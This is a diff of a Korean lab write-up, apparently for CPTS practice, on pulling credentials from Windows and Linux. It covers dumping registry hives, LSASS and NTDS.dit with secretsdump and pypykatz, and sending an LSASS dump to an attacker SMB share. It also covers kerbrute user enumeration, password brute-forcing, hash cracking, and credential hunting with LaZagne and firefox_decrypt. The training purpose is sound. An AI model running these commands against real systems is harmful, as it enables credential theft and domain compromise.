@@ -2,7 +2,7 @@
 title: "Password Attacks - Extracting Passwords from Windows and Linux"
 date: 2026-08-15
 layout: single
-excerpt: "Windows 환경에서 파일, 브라우저, 레지스트리, 저장된 세션, 백업, 클립보드 등을 통해 자격 증명을 수집하고, 사용자 상호작용 및 다양한 추가 기법을 활용해 권한 상승과 횡적 이동으로 이어지는 공격 흐름을 실습한다."
+excerpt: "Windows의 SAM, SYSTEM, SECURITY 하이브와 LSASS, NTDS.dit, Linux의 passwd, shadow 및 구성, 히스토리, 브라우저 파일을 분석하여 저장된 자격 증명을 추출하고 검증하는 흐름을 실습한다."
 author_profile: true
 toc: true
 toc_label: "Password Attacks"
@@ -10,29 +10,33 @@ toc_icon: "book"
 toc_sticky: true
 categories: [cpts-infra]
 tags: [windows, cpts, priv-esc, credential-theft, pillaging, lateral-movement, registry, browser-credentials, scheduled-tasks]
-
-published: false
 ---
+
+Windows의 SAM, SYSTEM, SECURITY 하이브와 LSASS, NTDS.dit, Linux의 passwd, shadow 및 구성, 히스토리, 브라우저 파일을 분석하여 저장된 자격 증명을 추출하고 검증하는 흐름을 실습한다.
 
 # Window
 
 ## Windows Authentication Process
 
-윈도우에선 로그인을 할때 각 단계를 거치게 된다.
+Windows에서는 사용자가 로그인할 때 여러 인증 구성 요소를 거치게 된다.
 
-우선 로그인을 하면 WINLOGON 서비스로 인해서 그 자격증명을 적는 란이 존재하게되고, 자격증명을 입력하면 LSA/LSASS가 그 자격증명과 일치하는지 확인하게 된다.
+사용자가 로그인을 시도하면 Winlogon과 자격 증명 공급자(Credential Provider)를 통해 자격 증명이 수집되고, 이후 LSA와 LSASS가 인증 처리를 담당한다.
 
-만약 LSASS가 일치하는 자격증명을 발견하지못하면 로그인에 실패하게되고, 발견하면 LSASS 메모리에 저장하는 구조이다.
+입력된 자격 증명이 올바르지 않으면 인증에 실패하며, 인증에 성공한 뒤에는 인증 방식과 세션 상태에 따라 해시, Kerberos 티켓 등 여러 인증 자료가 LSASS 메모리에 존재할 수 있다.
 
-그 LSASS가 보는 파일은 로컬이면 sam, 도메인 계정이면 ntds.dit 파일을 기준으로 참고한다.
+로컬 계정의 자격 증명 정보는 주로 SAM에 저장되며, Active Directory 도메인 계정 정보는 도메인 컨트롤러의 NTDS.dit에 저장된다. 
 
-즉, 따라서 lsass는 인증의 중심이며, 그 인증을 수행하기 위하여 sam, ntds.dit 파일을 참고하는 형태이다.
+실제 인증 과정에서는 로컬 인증과 도메인 인증에 따라 관련 인증 패키지와 도메인 컨트롤러가 이러한 정보를 사용한다.
 
-> 추가로 security 파일이 존재한다. 이 파일은 lsa가 따로 현재 자동화 로그인을 수행할때 그 자동화를 수행시키기위한 자격증명을 저장시켜야 하기에 저장시킨 숨켜진 자격증명을 가져오거나, dpapi의 복호화를 수행할때 필요한 키를 보관하는 파일이다. 
+즉, LSASS는 Windows 인증의 핵심 프로세스이며, 로컬 계정과 도메인 계정은 각각 서로 다른 자격 증명 저장소와 인증 흐름을 사용한다고 이해하면 된다.
+
+> 추가로 SECURITY 하이브가 존재한다. 이 하이브에는 LSA Secrets, Cached Domain Logon 관련 정보, 서비스 계정의 비밀 정보, DPAPI_SYSTEM과 같은 시스템 수준의 비밀 값이 저장될 수 있다. 따라서 SYSTEM 하이브와 함께 분석하면 이러한 값을 복호화하여 추출할 수 있다.
 
 ## Attacking SAM, SYSTEM, and SECURITY
 
-우선 이렇게 sam, system, security 파일을 다운로드 받았다:
+### Saving and Extracting Registry Hives
+
+우선 SAM, SYSTEM, SECURITY 레지스트리 하이브를 파일로 저장하였다:
 
 ```powershell
 *Evil-WinRM* PS C:\Users\bob\Documents> reg.exe save hklm\sam C:\sam.save
@@ -45,9 +49,9 @@ The operation completed successfully.
 The operation completed successfully.
 ```
 
-현재 위 파일들은 사용중이기에 copy 같은 명령으로 복사하는것이 아닌 save를 통하여 복사를 해야한다.
+현재 시스템에서 사용 중인 레지스트리 하이브이기 때문에 일반적인 `copy` 가 아니라 `reg save` 를 사용하여 별도의 파일로 저장한다.
 
-이후 각 파일들을 다운로드 시켜주었다:
+이후 저장된 각 파일을 로컬로 다운로드하였다:
 
 ```powershell
 *Evil-WinRM* PS C:\> download sam.save                                        
@@ -60,7 +64,7 @@ Info: Download successful!
 Info: Download successful!
 ```
 
-이후, secretdump을 활용하여 덤프할수있다:
+이후 `impacket-secretsdump` 를 활용하여 자격 증명과 LSA Secrets를 추출할 수 있다:
 
 ```bash
 $ impacket-secretsdump -sam sam.save -system system.save -security security.save local
@@ -93,9 +97,9 @@ NL$KM:e4fe184b25468118bf23f5a32ae836976ba492b3a432deb3911746b8ec63c451a70c1826e9
                   
 ```
 
-이처럼 여러 유저들의 ntlm과, dpapl 복호화키가 나온것을 확인할수있고, _SC_gupdate(Service Control Manager) 관련 서비스 평문 계정이 존재한다.
+이처럼 여러 로컬 사용자의 NTLM 해시와 DPAPI 관련 시스템 키를 확인할 수 있으며, `\_SC\_gupdate` 항목에서는 `gupdate` 서비스에 저장된 서비스 계정 암호가 평문으로 추출된 것을 확인할 수 있다.
 
-이 계쩡은 서비스이기 레지스트리를 활용하여 어떤 사용자로 이뤄져있는지도 확인할수있다:
+이 값이 어떤 서비스 계정에 해당하는지는 레지스트리의 서비스 설정에서 `ObjectName` 값을 조회하여 확인할 수 있다:
 
 ```powershell
 *Evil-WinRM* PS C:\> reg query HKLM\SYSTEM\CurrentControlSet\Services\gupdate /v ObjectName
@@ -104,7 +108,7 @@ HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\gupdate
     ObjectName    REG_SZ    .\frontdesk
 ```
 
-이처럼 현재 `frontdesk` 유저가 저 서비스의 관리자이며 최종적으로 이렇게된다:
+이처럼 현재 `gupdate` 서비스가 `.\frontdesk` 계정으로 실행되도록 설정되어 있으므로, 앞서 추출한 평문 암호와 조합하면 다음 자격 증명을 얻을 수 있다:
 
 ```text
 frontdesk:Password123
@@ -112,29 +116,31 @@ frontdesk:Password123
 
 ## Attacking LSASS
 
-또한 위에서 보다시피 lsass 덤프를 활용하여 추출하는 방법이 있따.
+### Creating an LSASS MiniDump
 
-lsass는 comsvcs.dll dll파일을 활용하여 미니 덤프를 수행할수있다.
+또 다른 방법으로 LSASS 프로세스의 메모리를 덤프하여 현재 로그인 세션에 남아 있는 인증 정보를 추출할 수 있다.
 
-우선 내부에 lssas.exe 서비스가 어떤 pid로 실행중인지 확인하였다:
+Windows의 `comsvcs.dll` 에 포함된 `MiniDump` 기능을 `rundll32` 로 호출하면 LSASS 프로세스의 메모리 덤프를 생성할 수 있다.
+
+우선 시스템에서 `lsass.exe` 프로세스가 어떤 PID로 실행 중인지 확인하였다:
 
 ![Password Attacks](/assets/cpts-infra/password-attacks-extracting-passwords-from-windows-and-linux/pw-attack1.png)
 
-이처럼 현재 pid 660에서 실행중임을 확인하였다.
+이처럼 현재 LSASS가 PID 660으로 실행 중임을 확인하였다.
 
-따라서 이를 활용하여 rundll32를 통해 덤프의 dll인 comsvcs.dll를 호출하여 lsass의 메모리를 덤프할수있다.
+따라서 확인한 PID를 사용하여 `rundll32` 로 `comsvcs.dll` 의 `MiniDump` 기능을 호출하고 LSASS 메모리를 덤프할 수 있다.
 
-이렇게 명령을 작성하였다:
+다음과 같이 명령을 실행하였다:
 
 ```powershell
 PS C:\Windows\system32> rundll32 C:\windows\system32\comsvcs.dll, MiniDump 660 C:\lsass.dmp full
 ```
 
-이처럼 덤프에 성공하게되면 dump가 된 파일이 c디렉토리에 생성돼었다.
+덤프에 성공하면 `C:\lsass.dmp` 파일이 생성된다.
 
-따라서 위 파일을 이용하여 오프라인으로 나의 로컬 터미널에서 pypykatz를 통해 덤프가 가능해질수있다.
+이 파일을 로컬로 가져오면 `pypykatz` 를 사용하여 오프라인에서 LSASS 덤프를 분석할 수 있다.
 
-우선 나의 로컬에 smbserver를 켜놓은후:
+우선 로컬 Kali에서 SMB 서버를 실행하였다:
 
 ```bash
 $ sudo impacket-smbserver share . -smb2support -username kali -password kali
@@ -146,17 +152,19 @@ $ sudo impacket-smbserver share . -smb2support -username kali -password kali
 [*] Config file parsed
 ```
 
-net use를 통해 신뢰를 받을수 있게 설정하엿다:
+이후 Windows에서 `net use` 를 통해 SMB 서버에 인증하였다:
 
 ![Password Attacks](/assets/cpts-infra/password-attacks-extracting-passwords-from-windows-and-linux/pw-attack2.png)
 
-이후 copy 명령을 통해 보내주게 되면 전달에 성공하게된다:
+그 다음 `copy` 명령으로 LSASS 덤프 파일을 SMB 공유로 전송하였다:
 
 ```powershell
 PS C:\Windows\system32> copy C:\lsass.dmp \\10.10.15.31\share
 ```
 
-이후 pypykatz를 통하여 덤프해주었다:
+### Offline Analysis with pypykatz
+
+이후 `pypykatz` 를 사용하여 덤프 파일을 분석하였다:
 
 ```bash
 $ pypykatz lsa minidump ./lsass.dmp 
@@ -195,15 +203,15 @@ luid 120980
 # SKIP
 ```
 
-이처럼 덤프에 성공하게된다.
+이처럼 LSASS 덤프에서 로그인 세션과 NT 해시 등의 인증 정보를 확인할 수 있다.
 
 ## Attacking Active Directory and NTDS.dit
 
-### 유저찾기
+### Username Enumeration
 
-윈도우의 로컬 보관소 sam과 달리 AD 환경에서는 NTDS.DIT이 존재한다.
+Windows 로컬 계정의 자격 증명이 SAM에 저장되는 것과 달리, Active Directory 환경에서는 도메인 계정 정보가 도메인 컨트롤러의 `NTDS.dit` 데이터베이스에 저장된다.
 
-우선 이 공격을 수행하기전, 이러한 사용자 정보들이 존재하였다:
+우선 사용자 이름을 열거하기 전에 다음과 같은 실제 사용자 이름 정보를 확보하였다:
 
 ```text
 John Marston
@@ -211,9 +219,9 @@ Carol Johnson
 Jennifer Stapleton
 ```
 
-이 정보들을 토대로 각 저 계정과 비슷한 여러 아이디를 생성해주는 username-anarchy 툴이 존재한다.
+이와 같은 실명 정보를 기반으로 가능한 사용자명 패턴을 생성해 주는 `username-anarchy` 도구를 사용할 수 있다.
 
-따라서 저 툴을 이용하여 이름들을 name.txt 파일로 저장한 후, 비슷한 아이디를 여러개 생성할수있다:
+따라서 이름들을 `names.txt` 에 저장한 뒤 `username-anarchy` 를 실행하여 여러 사용자명 후보를 생성하였다:
 
 ```bash
 $ ./username-anarchy -i names.txt 
@@ -235,7 +243,7 @@ jm
 carol
 ```
 
-우선 도메인 명을 보기위해 nxc로 테스트를 하였다:
+먼저 도메인 이름을 확인하기 위해 NXC로 SMB 정보를 조회하였다:
 
 ```bash
 $ nxc smb 10.129.129.64 -u '' -p ''
@@ -244,9 +252,9 @@ SMB         10.129.129.64   445    ILF-DC01         [*] Windows 10 / Server 2019
 SMB         10.129.129.64   445    ILF-DC01         [+] ILF.local\: 
 ```
 
-이처럼 지금 ILF-DC01 이며 명은 ILF.local 임을 확인하였다
+이처럼 대상 호스트의 이름은 `ILF-DC01`, 도메인은 `ILF.local` 임을 확인하였다.
 
-이를 토대로 만들어진 계정을 토대로 kerbrute를 통하여 유저를 열거할수잇따:
+생성한 사용자명 후보 목록을 기반으로 `kerbrute` 를 사용하여 실제로 존재하는 도메인 사용자를 열거할 수 있다:
 
 ```bash
 $ kerbrute userenum --dc 10.129.129.64 --domain ILF.local userenum.txt
@@ -260,9 +268,9 @@ $ kerbrute userenum --dc 10.129.129.64 --domain ILF.local userenum.txt
 2026/08/16 20:10:05 >  Done! Tested 43 usernames (3 valid) in 1.052 seconds
 ```
 
-현재 jmarston, cjohnson, jstapleton 3명의 유저가 잡혔다.
+그 결과 `jmarston`, `cjohnson`, `jstapleton` 세 사용자가 유효한 계정으로 확인되었다.
 
-이후 각 사용자마다 패스워드 브루트포싱을 시도한결과 이처럼 계정이 잡히게되었다:
+이후 각 사용자에 대해 지정된 워드리스트를 사용하여 암호 인증을 시도했고, 다음과 같이 유효한 자격 증명을 확인하였다:
 
 ```bash
 $ nxc smb 10.129.129.64 -u jmarston -p /usr/share/set/src/fasttrack/wordlist.txt
@@ -272,13 +280,13 @@ SMB         10.129.129.64   445    ILF-DC01         [*] Windows 10 / Server 2019
 SMB         10.129.129.64   445    ILF-DC01         [+] ILF.local\jmarston:P@ssword! (Pwn3d!)
 ```
 
-그 결과 이처럼 jmarston유저의 패스워드까지 확보하게 되었다
+그 결과 `jmarston` 사용자의 암호까지 확보하였다.
 
-PWD가 뜬걸 보니 관리자 계정임을 암시할수있다.
+NXC 출력의 `Pwn3d!` 표시는 해당 자격 증명으로 대상 호스트에서 관리자 수준의 원격 작업이 가능하다고 판단되었음을 의미한다.
 
-### ntds.dit
+### Extracting NTDS.dit
 
-따라서 위에 winrm을 통하여 접속한 후 내부에 모든 권한이 활성화되어하였따:
+이후 WinRM으로 접속한 뒤 현재 계정의 권한을 확인하였다:
 
 ```powershell
 *Evil-WinRM* PS C:\Users\jmarston\Documents> whoami /priv
@@ -299,9 +307,9 @@ SeSystemtimePrivilege                     Change the system time                
 # SKIP
 ```
 
-이 섹션 취지에 맞게 NTDS.DIT을 추출하여 할수있다.
+관리자 권한을 확보한 상태에서는 도메인 컨트롤러의 `NTDS.dit` 과 이를 복호화하는 데 필요한 SYSTEM 하이브를 추출할 수 있다.
 
-우선 파일의 내용 해제하는 system파일을 먼저 save 후 다운로드 해주었다:
+우선 `NTDS.dit` 내부의 암호화된 자격 증명을 해석하는 데 필요한 BootKey를 얻기 위해 SYSTEM 하이브를 저장하였다:
 
 ```powershell
 *Evil-WinRM* PS C:\Users\jmarston\Documents> reg.exe save hklm\system C:\Users\jmarston\system
@@ -309,9 +317,11 @@ SeSystemtimePrivilege                     Change the system time                
 The operation completed successfully.
 ```
 
-그 이후, ntds.dit은 실행 중인 DC가 NTDS.dit을 계속 사용하고 있어서 위처럼 세이브가 불가능하여 vssadmin을 통하여 카피하는 방식을 사용하거나 할수있따.
+`NTDS.dit` 은 실행 중인 도메인 컨트롤러에서 사용 중인 파일이므로 일반적인 방식으로 직접 복사하기 어렵다. 
 
-따라서 이렇게 카피하였따:
+따라서 Volume Shadow Copy를 생성한 뒤 해당 스냅샷에서 파일을 복사할 수 있다.
+
+먼저 다음과 같이 `C:` 드라이브의 Shadow Copy를 생성하였다:
 
 ```powershell
 *Evil-WinRM* PS C:\Users\jmarston> vssadmin CREATE SHADOW /For=C:
@@ -324,9 +334,9 @@ Successfully created shadow copy for 'C:\'
     Shadow Copy Volume Name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
 ```
 
-이처럼 c:\ 디렉토리를 카피하였다.
+이처럼 `C:` 볼륨의 Shadow Copy가 생성되었으며, 출력된 Shadow Copy Volume Name 경로를 사용할 수 있다.
 
-이를 활용하여 위 셰도우 카피 경로의 ntds.dit 파일을 가져와 현재 디렉토리로 복사하였따:
+해당 Shadow Copy 경로에서 `NTDS.dit` 을 현재 작업 디렉터리로 복사하였다:
 
 ```powershell
 *Evil-WinRM* PS C:\Users\jmarston> cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit ./NTDS.dit
@@ -334,7 +344,7 @@ Successfully created shadow copy for 'C:\'
         1 file(s) copied.
 ```
 
-이후 download를 통하여 나의 로컬로 복사한뒤에 시크릿 덤프를 활용하여 dc 유저들의 해시를 캐낼수가잇따:
+이후 `NTDS.dit` 과 SYSTEM 하이브를 로컬로 다운로드한 뒤 `impacket-secretsdump` 를 사용하면 도메인 계정의 해시를 추출할 수 있다:
 
 ```bash
 $ impacket-secretsdump -ntds ntds.dit -system system LOCAL
@@ -357,7 +367,9 @@ LAPTOP01$:1111:aad3b435b51404eeaad3b435b51404ee:be2abbcd5d72030f26740fb531f1d7c4
 # SKIP
 ```
 
-또한 매우빠르게 NXC의 -M ntdsutil 옵션을 통하여 바로 해시를 가져오는 방식도 존재한다:
+### NetExec ntdsutil Module
+
+또한 충분한 권한이 있다면 NXC의 `-M ntdsutil` 모듈을 사용하여 이 과정을 자동화하고 도메인 자격 증명 해시를 추출할 수도 있다:
 
 ```bash
 $ nxc smb 10.129.129.64 -u jmarston -p P@ssword! -M ntdsutil
@@ -381,15 +393,15 @@ NTDSUTIL    10.129.129.64   445    ILF-DC01         LAPTOP01$:1111:aad3b435b5140
 
 ## Linux Authentication Process
 
-리눅스에선 passwd 파일과 각 유저들의 자격증명이 존재하는 shadow 파일이 존재함을 알수있다.
+Linux에서는 `/etc/passwd` 에 사용자 계정 정보가 저장되고, 실제 비밀번호 해시는 일반적으로 권한이 제한된 `/etc/shadow` 에 저장된다.
 
-만약 root 권한상승을 한 이후, 추가의 자격증명을 확보하기 위하여 shadow 파일과 passwd 을 혼합시켜 만드는 unshadow 도구를 활용하여 크랙에 시도할수있따:
+root 권한을 확보한 뒤 추가 자격 증명을 확인하려는 경우, `passwd` 와 `shadow` 의 정보를 `unshadow` 로 결합하여 크랙 도구에서 사용할 입력 파일을 만들 수 있다:
 
 ```bash
 $ unshadow passwd shadow > unshadowed.hashes
 ```
 
-이후 hashcat을 사용하여 각 사용자의 자격증명을 가져오거나 할수있다:
+이후 Hashcat을 사용하여 해당 해시에 대해 사전 기반 크랙을 시도할 수 있다:
 
 ```bash
 $ hashcat -m 1800 unshadowed.hashes /usr/share/wordlists/rockyou.txt --show --username
@@ -397,9 +409,9 @@ $ hashcat -m 1800 unshadowed.hashes /usr/share/wordlists/rockyou.txt --show --us
 sarah:$6$EBOM5vJAV1TPvrdP$LqsLyYkoGzAGt4ihyvfhvBrrGpVjV976B3dEubi9i95P5cDx1U6BrE9G020PWuaeI6JSNaIDIbn43uskRDG0U/:mariposa
 ```
 
-이처럼 sarah 계정은 `mariposa` 비번임을 확인하였다.
+이처럼 `sarah` 계정의 비밀번호가 `mariposa` 임을 확인하였다.
 
-또한 john을 활용해 단일 크랙모드를 활용하여 각 사용자의 비번맞춤형으로 크랙에 성공하였다:
+또한 John the Ripper의 `--single` 모드를 사용하면 사용자명과 계정 정보를 기반으로 생성한 후보를 이용해 맞춤형 크랙을 시도할 수 있다:
 
 ```bash
 $ john  --single unshadowed.hashes
@@ -407,24 +419,27 @@ $ john  --single unshadowed.hashes
 Martin1          (martin)
 ```
 
-별개로 /etc/security/opasswd 도 존재한다
+별개로 일부 Linux 환경에서는 `/etc/security/opasswd` 파일이 존재할 수 있다.
 
-이건 예전에 사용했던 비밀번호 hash를 저장해서 password reuse를 막는 용도.
-오래된 약한 hash가 있으면 이전 비밀번호 패턴을 알아낼 수 있음.
+이 파일은 PAM의 비밀번호 히스토리 기능에서 이전 비밀번호의 해시를 저장하여 비밀번호 재사용을 방지하는 데 사용될 수 있다.
+
+따라서 접근 권한이 있는 경우 오래된 해시를 통해 과거 비밀번호 패턴에 대한 단서를 얻을 수도 있다.
 
 ## Credential Hunting in Linux
 
-리눅스에선 대부분 윈도우의 여러 레지스트리, LSASS 같은거와 다르게 파일 기반으로 자격증명을 저장시키기에 좀더 자격증명을 찾기 수월하다.
+### Searching Files for Stored Credentials
 
-대부분의 자격증명은 이런곳에 존재한다:
+Linux 환경에서는 애플리케이션 설정, 쉘 히스토리, 스크립트 등 다양한 파일에 자격 증명이 평문 또는 설정 값 형태로 남아 있을 수 있으므로 파일 기반으로 Credential Hunting을 수행하는 경우가 많다.
+
+대표적으로 다음과 같은 위치를 확인할 수 있다:
 
 ```text
 config + history + scripts + cron + SSH key + browser/keyring
 ```
 
-이처럼 web에 쓰이는 config .conf 같은 파일에 자격증명이 존재할수있고, bash_history 에서와 같이 어떤 명령어 이후 자격증명을 쓰인 그런 경우도 존재하게된다.
+웹 애플리케이션이나 서비스에서 사용하는 `.conf`, `.config`, `.cnf` 같은 설정 파일에 자격 증명이 포함될 수 있고, `.bash_history` 에도 사용자가 명령줄에 직접 입력한 계정 정보나 암호가 남아 있을 수 있다.
 
-이처럼 conf 파일 관련을 찾기위해 적을수가 있다:
+먼저 설정 파일을 찾기 위해 다음과 같이 확장자를 기준으로 검색할 수 있다:
 
 ```bash
 kira@nix01:~$ for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done
@@ -446,7 +461,7 @@ File extension:  .conf
 # SKIP
 ```
 
-또한 이처럼 패스워드에 관련하여 grep을 이용해 찾는 방식도 존재한다:
+찾아낸 설정 파일 내부에서 `user`, `password`, `pass` 와 같은 키워드를 `grep` 으로 검색하는 방법도 있다:
 
 ```bash
 kira@nix01:~$ for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#";done
@@ -464,7 +479,9 @@ File:  /etc/ssl/openssl.cnf
 challengePassword               = A challenge password
 ```
 
-그리고 txt 파일을 찾기 위하여 이런식으로 작성도 가능하며:
+### Searching Text and Script Files
+
+텍스트 파일이나 확장자가 없는 파일을 찾기 위해 다음과 같이 검색할 수도 있다:
 
 ```bash
 kira@nix01:~$ find /home/* -type f -name "*.txt" -o ! -name "*.*"
@@ -481,7 +498,7 @@ kira@nix01:~$ find /home/* -type f -name "*.txt" -o ! -name "*.*"
 # SKIP
 ```
 
-또한 스크립트에서도 자격증명이 존재할수도 있기에 이런식으로 작성이 가능하다:
+스크립트 내부에 하드코딩된 자격 증명이 존재할 수도 있으므로 여러 스크립트 확장자를 함께 검색할 수 있다:
 
 ```bash
 kira@nix01:~$ for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share";done
@@ -512,7 +529,9 @@ File extension:  .sh
 # SKIP
 ```
 
-디비 파일도 무시 못하기에 DB 확장자 관련 파일을 찾고 그 안에서 자격증명을 찾을수도있다:
+### Checking Database Files and Shell History
+
+데이터베이스 파일에도 계정 정보나 애플리케이션 데이터가 저장될 수 있으므로 관련 확장자를 검색할 수 있다:
 
 ```bash
 kira@nix01:~$ for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man";done
@@ -529,7 +548,7 @@ DB File extension:  .db
 # SKIP
 ```
 
-또한 bash_history에서도 사용자가 적은 자격증명이 존재할수도 있다:
+또한 `.bash_history` 를 확인하면 사용자가 과거에 입력한 명령에서 자격 증명이나 접근 경로에 대한 단서를 찾을 수도 있다:
 
 ```bash
 kira@nix01:~$ tail -n5 /home/*/.bash*
@@ -542,9 +561,9 @@ su
 # SKIP
 ```
 
-그리고 리눅스 자격증명 찾기 관련해서 툴이 존재한다.
+### Automated Credential Hunting with LaZagne
 
-윈도우에서도 있었던 자동화 LaZagne 툴을 활용하여 자격증명을 토해낼수도 있게된다:
+Linux에서도 LaZagne와 같은 자동화 도구를 사용하여 브라우저, 애플리케이션 설정 등 여러 위치에 저장된 자격 증명을 탐색할 수 있다:
 
 ```bash
 kira@nix01:~/Linux$ python3 laZagne.py all
@@ -559,9 +578,11 @@ Login: will@inlanefreight.htb
 Password: TUqr7QfLTLhruhVbCP
 ```
 
-또한 대부분 파이어 폭스를 사용하면 파이어폭스 브라우저에 웹 페이지 로그인 정보를 저장할 때, 해당 정보는 암호화되어 logins.json 파일에 저장되게 된다.
+### Firefox Stored Credentials
 
-따라서 내부에 파일이 이렇게 존재함을 확인할수있다:
+Firefox에서 웹 페이지 로그인 정보를 저장하면 로그인 항목은 프로필의 `logins.json` 에 암호화된 형태로 기록되며, 복호화에 필요한 키 정보는 같은 프로필의 `key4.db` 등에 저장된다.
+
+우선 Firefox 프로필 디렉터리가 다음과 같이 존재하는 것을 확인할 수 있다:
 
 ```bash
 kira@nix01:~$ ls -l .mozilla/firefox/ | grep default
@@ -570,7 +591,7 @@ drwx------  2 kira kira 4096 Aug 17 04:29 lktd9y8y.default
 drwx------ 10 kira kira 4096 Aug 17 04:29 ytb95ytb.default-release
 ```
 
-이중 logins.json을 보면 이처럼 이름과 비밀번호가 암호화되어잇는것을 확인할수있다:
+이 중 사용 중인 프로필의 `logins.json` 을 확인하면 사용자 이름과 비밀번호가 암호화된 값으로 저장되어 있는 것을 볼 수 있다:
 
 ```bash
 kira@nix01:~/.mozilla/firefox/ytb95ytb.default-release$ cat logins.json | jq .
@@ -601,7 +622,7 @@ kira@nix01:~/.mozilla/firefox/ytb95ytb.default-release$ cat logins.json | jq .
 }
 ```
 
-이제 이 복호화를 풀기위해 Firefox Decrypt 도구를 사용할수있따.
+이 저장 정보를 복호화하기 위해 `firefox_decrypt` 도구를 사용할 수 있다:
 
 ```bash
 kira@nix01:~$ python3.9 firefox_decrypt.py
